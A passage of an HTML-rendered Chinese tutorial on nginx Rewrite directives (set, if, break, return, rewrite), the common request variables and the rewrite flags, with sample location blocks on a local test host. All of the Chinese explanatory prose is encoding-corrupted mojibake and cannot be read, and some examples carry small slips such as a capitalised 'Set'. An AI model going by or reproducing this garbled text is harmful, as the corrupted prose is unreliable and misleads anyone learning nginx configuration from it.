class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">set</span>æŒ‡ä»¤<br><span class="hljs-keyword">if</span>æŒ‡ä»¤<br><span class="hljs-keyword">break</span>æŒ‡ä»¤<br><span class="hljs-keyword">return</span>æŒ‡ä»¤<br>rewriteæŒ‡ä»¤<br>rewrite_logæŒ‡ä»¤<br></code></pre></td></tr></table></figure><p>Rewriteçš„åº”ç”¨åœºæ™¯</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">åŸŸåè·³è½¬<br>åŸŸåé•œåƒ<br>ç‹¬ç«‹åŸŸå<br>ç›®å½•è‡ªåŠ¨æ·»åŠ <span class="hljs-string">&quot;/&quot;</span><br>åˆå¹¶ç›®å½•<br>é˜²ç›—é“¾çš„å®ç°<br></code></pre></td></tr></table></figure><h3 id="rewriteçš„ç›¸å…³æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#rewriteçš„ç›¸å…³æŒ‡ä»¤"></a> Rewriteçš„ç›¸å…³æŒ‡ä»¤</h3><h4 id="setæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#setæŒ‡ä»¤"></a> setæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®ä¸€ä¸ªæ–°çš„å˜é‡ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>set $variable value;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€locationã€if</td></tr></tbody></table><p>variable:å˜é‡çš„åç§°ï¼Œè¯¥å˜é‡åç§°è¦ç”¨&quot;$&quot;ä½œä¸ºå˜é‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä¸”ä¸è¦ä¸NginxæœåŠ¡å™¨é¢„è®¾çš„å…¨å±€å˜é‡åŒåã€‚</p><p>value:å˜é‡çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€å…¶ä»–å˜é‡æˆ–è€…å˜é‡çš„ç»„åˆç­‰ã€‚</p><h4 id="rewriteå¸¸ç”¨å…¨å±€å˜é‡"><a class="markdownIt-Anchor" href="#rewriteå¸¸ç”¨å…¨å±€å˜é‡"></a> Rewriteå¸¸ç”¨å…¨å±€å˜é‡</h4><table><thead><tr><th>å˜é‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>$args</td><td>å˜é‡ä¸­å­˜æ”¾äº†è¯·æ±‚URLä¸­çš„è¯·æ±‚å‚æ•°ã€‚æ¯”å¦‚http://192.168.200.133/server?arg1=value1&amp;args2=value2ä¸­çš„&quot;arg1=value1&amp;arg2=value2&quot;ï¼ŒåŠŸèƒ½å’Œ$query_stringä¸€æ ·</td></tr><tr><td>$http_user_agent</td><td>å˜é‡å­˜å‚¨çš„æ˜¯ç”¨æˆ·è®¿é—®æœåŠ¡çš„ä»£ç†ä¿¡æ¯(å¦‚æœé€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œè®°å½•çš„æ˜¯æµè§ˆå™¨çš„ç›¸å…³ç‰ˆæœ¬ä¿¡æ¯)</td></tr><tr><td>$host</td><td>å˜é‡å­˜å‚¨çš„æ˜¯è®¿é—®æœåŠ¡å™¨çš„server_nameå€¼</td></tr><tr><td>$document_uri</td><td>å˜é‡å­˜å‚¨çš„æ˜¯å½“å‰è®¿é—®åœ°å€çš„URIã€‚æ¯”å¦‚http://192.168.200.133/server?id=10&amp;name=zhangsanä¸­çš„&quot;/server&quot;ï¼ŒåŠŸèƒ½å’Œ$uriä¸€æ ·</td></tr><tr><td>$document_root</td><td>å˜é‡å­˜å‚¨çš„æ˜¯å½“å‰è¯·æ±‚å¯¹åº”locationçš„rootå€¼ï¼Œå¦‚æœæœªè®¾ç½®ï¼Œé»˜è®¤æŒ‡å‘Nginxè‡ªå¸¦htmlç›®å½•æ‰€åœ¨ä½ç½®</td></tr><tr><td>$content_length</td><td>å˜é‡å­˜å‚¨çš„æ˜¯è¯·æ±‚å¤´ä¸­çš„Content-Lengthçš„å€¼</td></tr><tr><td>$content_type</td><td>å˜é‡å­˜å‚¨çš„æ˜¯è¯·æ±‚å¤´ä¸­çš„Content-Typeçš„å€¼</td></tr><tr><td>$http_cookie</td><td>å˜é‡å­˜å‚¨çš„æ˜¯å®¢æˆ·ç«¯çš„cookieä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡add_header Set-Cookie 'cookieName=cookieValueâ€™æ¥æ·»åŠ cookieæ•°æ®</td></tr><tr><td>$limit_rate</td><td>å˜é‡ä¸­å­˜å‚¨çš„æ˜¯NginxæœåŠ¡å™¨å¯¹ç½‘ç»œè¿æ¥é€Ÿç‡çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯Nginxé…ç½®ä¸­å¯¹limit_rateæŒ‡ä»¤è®¾ç½®çš„å€¼ï¼Œé»˜è®¤æ˜¯0ï¼Œä¸é™åˆ¶ã€‚</td></tr><tr><td>$remote_addr</td><td>å˜é‡ä¸­å­˜å‚¨çš„æ˜¯å®¢æˆ·ç«¯çš„IPåœ°å€</td></tr><tr><td>$remote_port</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å»ºç«‹è¿æ¥çš„ç«¯å£å·</td></tr><tr><td>$remote_user</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯çš„ç”¨æˆ·åï¼Œéœ€è¦æœ‰è®¤è¯æ¨¡å—æ‰èƒ½è·å–</td></tr><tr><td>$scheme</td><td>å˜é‡ä¸­å­˜å‚¨äº†è®¿é—®åè®®</td></tr><tr><td>$server_addr</td><td>å˜é‡ä¸­å­˜å‚¨äº†æœåŠ¡ç«¯çš„åœ°å€</td></tr><tr><td>$server_name</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾çš„æœåŠ¡å™¨çš„åç§°</td></tr><tr><td>$server_port</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨çš„ç«¯å£å·</td></tr><tr><td>$server_protocol</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯è¯·æ±‚åè®®çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚&quot;HTTP/1.1&quot;</td></tr><tr><td>$request_body_file</td><td>å˜é‡ä¸­å­˜å‚¨äº†å‘ç»™åç«¯æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶èµ„æºçš„åç§°</td></tr><tr><td>$request_method</td><td>å˜é‡ä¸­å­˜å‚¨äº†å®¢æˆ·ç«¯çš„è¯·æ±‚æ–¹å¼ï¼Œæ¯”å¦‚&quot;GET&quot;,&quot;POST&quot;ç­‰</td></tr><tr><td>$request_filename</td><td>å˜é‡ä¸­å­˜å‚¨äº†å½“å‰è¯·æ±‚çš„èµ„æºæ–‡ä»¶çš„è·¯å¾„å</td></tr><tr><td>$request_uri</td><td>å˜é‡ä¸­å­˜å‚¨äº†å½“å‰è¯·æ±‚çš„URIï¼Œå¹¶ä¸”æºå¸¦è¯·æ±‚å‚æ•°ï¼Œæ¯”å¦‚http://192.168.200.133/server?id=10&amp;name=zhangsanä¸­çš„&quot;/server?id=10&amp;name=zhangsan&quot;</td></tr></tbody></table><p>ä¸Šè¿°å‚æ•°è¿˜å¯ä»¥åœ¨æ—¥å¿—æ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œè¿™ä¸ªå°±è¦ç”¨åˆ°å‰é¢æˆ‘ä»¬ä»‹ç»çš„<code>log_format</code>æŒ‡ä»¤</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span> main <span class="hljs-string">&#x27;<span class="hljs-variable">$remote_addr</span> - <span class="hljs-variable">$request</span> - <span class="hljs-variable">$status</span>-<span class="hljs-variable">$request_uri</span>  <span class="hljs-variable">$http_user_agent</span>&#x27;</span>;<br><br><span class="hljs-attribute">access_log</span> logs/access.log main;<br></code></pre></td></tr></table></figure><h4 id="ifæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#ifæŒ‡ä»¤"></a> ifæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤ç”¨æ¥æ”¯æŒæ¡ä»¶åˆ¤æ–­ï¼Œå¹¶æ ¹æ®æ¡ä»¶åˆ¤æ–­ç»“æœé€‰æ‹©ä¸åŒçš„Nginxé…ç½®ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>if  (condition){â€¦}</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€location</td></tr></tbody></table><p>conditionä¸ºåˆ¤å®šæ¡ä»¶ï¼Œå¯ä»¥æ”¯æŒä»¥ä¸‹å†™æ³•ï¼š</p><ol><li>å˜é‡åã€‚å¦‚æœå˜é‡åå¯¹åº”çš„å€¼ä¸ºç©ºå­—ç¬¦ä¸²æˆ–&quot;0&quot;ï¼Œiféƒ½åˆ¤æ–­ä¸ºfalse,å…¶ä»–æ¡ä»¶ä¸ºtrueã€‚</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$param</span>)&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨&quot;=â€œå’Œâ€!=&quot;æ¯”è¾ƒå˜é‡å’Œå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œæ»¡è¶³æ¡ä»¶ä¸ºtrueï¼Œä¸æ»¡è¶³ä¸ºfalse</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_method</span> = POST)&#123;<br><span class="hljs-attribute">return</span> <span class="hljs-number">405</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæ­¤å¤„å’ŒJavaä¸å¤ªä¸€æ ·çš„åœ°æ–¹æ˜¯å­—ç¬¦ä¸²ä¸éœ€è¦æ·»åŠ å¼•å·,å¹¶ä¸”ç­‰å·å’Œä¸ç­‰å·å‰ååˆ°éœ€è¦åŠ <strong>ç©ºæ ¼</strong>ã€‚</p><ol start="3"><li><p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹å˜é‡è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å˜é‡ä¸æ­£åˆ™è¡¨è¾¾å¼ä¹‹é—´ä½¿ç”¨&quot;<sub>&quot;,&quot;</sub>*&quot;,&quot;!<sub>&quot;,&quot;!</sub>*&quot;æ¥è¿æ¥ã€‚</p><p>&quot;~&quot;ä»£è¡¨åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼è¿‡ç¨‹ä¸­åŒºåˆ†å¤§å°å†™ï¼Œ</p><p>&quot;~*&quot;ä»£è¡¨åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼è¿‡ç¨‹ä¸­ä¸åŒºåˆ†å¤§å°å†™</p><p>&quot;!<sub>â€œå’Œâ€!</sub>*&quot;åˆšå¥½å’Œä¸Šé¢å–ç›¸åå€¼ï¼Œå¦‚æœåŒ¹é…ä¸Šè¿”å›false,åŒ¹é…ä¸ä¸Šè¿”å›true</p></li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_user_agent</span> <span class="hljs-regexp">~ MSIE)</span>&#123;<br><span class="hljs-comment">#$http_user_agentçš„å€¼ä¸­æ˜¯å¦åŒ…å«MSIEå­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ…å«è¿”å›true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦ä¸²ä¸€èˆ¬ä¸éœ€è¦åŠ å¼•å·ï¼Œä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«&quot;}â€œæˆ–è€…æ˜¯â€;&quot;ç­‰å­—ç¬¦æ—¶ï¼Œå°±éœ€è¦æŠŠå¼•å·åŠ ä¸Šã€‚</p><ol start="4"><li>åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä½¿ç”¨&quot;-f&quot;å’Œ&quot;!-f&quot;,</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (-f <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-comment">#åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>&#125;<br><span class="hljs-attribute">if</span> (!-f <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-comment">#åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦ä¸å­˜åœ¨</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li><p>åˆ¤æ–­è¯·æ±‚çš„ç›®å½•æ˜¯å¦å­˜åœ¨ä½¿ç”¨&quot;-d&quot;å’Œ&quot;!-d&quot;</p></li><li><p>åˆ¤æ–­è¯·æ±‚çš„ç›®å½•æˆ–è€…æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä½¿ç”¨&quot;-e&quot;å’Œ&quot;!-e&quot;</p></li><li><p>åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œä½¿ç”¨&quot;-x&quot;å’Œ&quot;!-x&quot;</p></li></ol><h4 id="breakæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#breakæŒ‡ä»¤"></a> breakæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤ç”¨äºä¸­æ–­å½“å‰ç›¸åŒä½œç”¨åŸŸä¸­çš„å…¶ä»–Nginxé…ç½®ã€‚ä¸è¯¥æŒ‡ä»¤å¤„äºåŒä¸€ä½œç”¨åŸŸçš„Nginxé…ç½®ä¸­ï¼Œä½äºå®ƒå‰é¢çš„æŒ‡ä»¤é…ç½®ç”Ÿæ•ˆï¼Œä½äºåé¢çš„æŒ‡ä»¤é…ç½®æ— æ•ˆã€‚<strong>å¹¶ä¸”breakè¿˜æœ‰å¦å¤–ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯ç»ˆæ­¢å½“å‰çš„åŒ¹é…å¹¶æŠŠå½“å‰çš„URIåœ¨æœ¬locationè¿›è¡Œé‡å®šå‘è®¿é—®å¤„ç†ã€‚</strong></p><table><thead><tr><th>è¯­æ³•</th><th>break;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€locationã€if</td></tr></tbody></table><p>ä¾‹å­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /testbreak&#123;<br>default_type text/plain;<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$username</span> TOM;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$args</span>)&#123;<br>Set <span class="hljs-variable">$username</span> JERRY;<br>        <span class="hljs-built_in">break</span>;<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$username</span> ROSE;<br>&#125;<br>add_header username <span class="hljs-variable">$username</span>;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-variable">$username</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="returnæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#returnæŒ‡ä»¤"></a> returnæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤ç”¨äºå®Œæˆå¯¹è¯·æ±‚çš„å¤„ç†ï¼Œç›´æ¥å‘å®¢æˆ·ç«¯è¿”å›ã€‚åœ¨returnåçš„æ‰€æœ‰Nginxé…ç½®éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>return code [text];<br/>return code URL;<br/>return URL;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€locationã€if</td></tr></tbody></table><p>code:ä¸ºè¿”å›ç»™å®¢æˆ·ç«¯çš„HTTPçŠ¶æ€ä»£ç†ã€‚å¯ä»¥è¿”å›çš„çŠ¶æ€ä»£ç ä¸º0~999çš„ä»»æ„HTTPçŠ¶æ€ä»£ç†</p><p>text:ä¸ºè¿”å›ç»™å®¢æˆ·ç«¯çš„å“åº”ä½“å†…å®¹ï¼Œæ”¯æŒå˜é‡çš„ä½¿ç”¨</p><p>URL:ä¸ºè¿”å›ç»™å®¢æˆ·ç«¯çš„URLåœ°å€</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br><br>return <span class="hljs-number">200</span> success;<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br><br>return https://www.baidu.com; // <span class="hljs-number">302</span>é‡å®šå‘åˆ°ç™¾åº¦<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br>return <span class="hljs-number">302</span> https://www.baidu.com;<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br>return <span class="hljs-number">302</span> www.baidu.com;//ä¸å…è®¸è¿™ä¹ˆå†™<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="rewriteæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#rewriteæŒ‡ä»¤"></a> rewriteæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼çš„ä½¿ç”¨æ¥æ”¹å˜URIã€‚å¯ä»¥åŒæ—¶å­˜åœ¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªæŒ‡ä»¤ï¼ŒæŒ‰ç…§é¡ºåºä¾æ¬¡å¯¹URLè¿›è¡ŒåŒ¹é…å’Œå¤„ç†ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>rewrite regex replacement [flag];</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€locationã€if</td></tr></tbody></table><p>regex:ç”¨æ¥åŒ¹é…URIçš„æ­£åˆ™è¡¨è¾¾å¼</p><p>replacement:åŒ¹é…æˆåŠŸåï¼Œç”¨äºæ›¿æ¢URIä¸­è¢«æˆªå–å†…å®¹çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¯¥å­—ç¬¦ä¸²æ˜¯ä»¥&quot;http://&quot;æˆ–è€…&quot;https://&quot;å¼€å¤´çš„ï¼Œåˆ™ä¸ä¼šç»§ç»­å‘ä¸‹å¯¹URIè¿›è¡Œå…¶ä»–å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›é‡å†™åçš„URIç»™å®¢æˆ·ç«¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/url\w*$</span> https://www.baidu.com;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag:ç”¨æ¥è®¾ç½®rewriteå¯¹URIçš„å¤„ç†è¡Œä¸ºï¼Œå¯é€‰å€¼æœ‰å¦‚ä¸‹ï¼š</p><ul><li>last:ç»ˆæ­¢ç»§ç»­åœ¨æœ¬locationå—ä¸­å¤„ç†æ¥æ”¶åˆ°çš„URIï¼Œå¹¶å°†æ­¤å¤„é‡å†™çš„URIä½œä¸ºä¸€ä¸ªæ–°çš„URIï¼Œä½¿ç”¨å„locationå—è¿›è¡Œå¤„ç†ã€‚è¯¥æ ‡å¿—å°†é‡å†™åçš„URIé‡å†™åœ¨serverå—ä¸­æ‰§è¡Œï¼Œ<strong>ä¸ºé‡å†™åçš„URIæä¾›äº†è½¬å…¥åˆ°å…¶ä»–locationå—çš„æœºä¼š</strong>ã€‚</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.200.133:8081/rewrite/testabc</code>,èƒ½æ­£ç¡®è®¿é—®</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589475653252.png" alt="1589475653252" /></p><ul><li>breakï¼šå°†æ­¤å¤„é‡å†™çš„URIä½œä¸ºä¸€ä¸ªæ–°çš„URI,åœ¨æœ¬å—ä¸­ç»§ç»­è¿›è¡Œå¤„ç†ã€‚è¯¥æ ‡å¿—å°†é‡å†™åçš„åœ°å€åœ¨å½“å‰çš„locationå—ä¸­æ‰§è¡Œï¼Œ<strong>ä¸ä¼šå°†æ–°çš„URIè½¬å‘å…¶ä»–çš„locationå—</strong>ã€‚</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br>    <span class="hljs-comment">#/test   /usr/local/nginx/html/test/index.html</span><br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.200.133:8081/rewrite/demoabc</code>,é¡µé¢æŠ¥404é”™è¯¯</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589475732042.png" alt="1589475732042" /></p><ul><li>redirectï¼šå°†é‡å†™åçš„URIè¿”å›ç»™å®¢æˆ·ç«¯ï¼ŒçŠ¶æ€ç ä¸º302ï¼ŒæŒ‡æ˜æ˜¯ä¸´æ—¶é‡å®šå‘URI,ä¸»è¦ç”¨åœ¨replacementå˜é‡ä¸æ˜¯ä»¥&quot;http://&quot;æˆ–è€…&quot;https://&quot;å¼€å¤´çš„æƒ…å†µã€‚</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">redirect</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">redirect</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®<code>http://192.168.200.133:8081/rewrite/testabc</code>è¯·æ±‚ä¼šè¢«ä¸´æ—¶é‡å®šå‘ï¼Œæµè§ˆå™¨åœ°å€ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜</p><ul><li>permanentï¼šå°†é‡å†™åçš„URIè¿”å›ç»™å®¢æˆ·ç«¯ï¼ŒçŠ¶æ€ç ä¸º301ï¼ŒæŒ‡æ˜æ˜¯æ°¸ä¹…é‡å®šå‘URI,ä¸»è¦ç”¨åœ¨replacementå˜é‡ä¸æ˜¯ä»¥&quot;http://&quot;æˆ–è€…&quot;https://&quot;å¼€å¤´çš„æƒ…å†µã€‚</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> 